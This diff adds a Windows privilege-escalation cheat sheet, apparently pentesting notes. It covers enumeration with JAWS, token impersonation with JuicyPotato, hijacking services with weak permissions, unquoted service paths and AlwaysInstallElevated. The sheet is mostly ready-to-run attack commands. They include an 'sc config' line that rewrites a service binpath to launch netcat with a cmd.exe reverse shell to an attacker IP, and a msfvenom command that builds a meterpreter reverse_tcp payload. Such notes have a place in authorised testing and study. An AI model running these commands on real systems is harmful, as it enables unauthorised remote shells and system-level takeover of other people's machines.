@@ -1,0 +1,55 @@
+---------------
+1) use JAWS tools
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+---------------
+
+2) Impersonate Token whoami /priv 
+to see any privilege is open to impersonate eg (SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege)
+
+if have use JuicyPotato, RottenPotato
+---------------
+
+3) Insecure Service Permissions
+
+-- use accesschk.exe  -uwcqv "testuser" * accesschk.exe -uwcqv "TestUser" *
+# check for services with weak permissions, (list all the services that an authenticated user can modify.)
+-- accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+
+# check for the found services above if they have write permissions
+-- sc qc "Vulnerable Service"
+-- sc config "Vulnerable Service" binpath= "C:\Inetpub\nc.exe -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe"
+
+#start the services
+net stop "Vulnerable Service"
+net start "Vulnerable Service"
+
+---------------------------------------------
+
+4) Unquoted Service Paths
+
+# find the affected paths manually
+-- wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+eg:
+-- C:\Program Files\somepath\example.exe is affected
+-- cd C:\Program Files\somepath\
+-- icacls example.exe
+
+# Check if you can write on this directory (see Everyone:(CI) (F) which means write permission for everyone)
+-- Create a payload (one of them given below can be used)
+-- msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > example.exe
+
+-- sc stop "Vulnerable Service"
+-- shutdown /r /t 0
+# Metasploit module for exploitation:
+-- trusted_service_path
+
+--------------------------------
+5) AlwaysInstallElevated
+-- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+If you got an error like “ERROR: The system was unable to find the specified registry key or value.” this means this registry values never created. So, the policy is not enabled.
+
+
+-- for furter you can see this link --
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
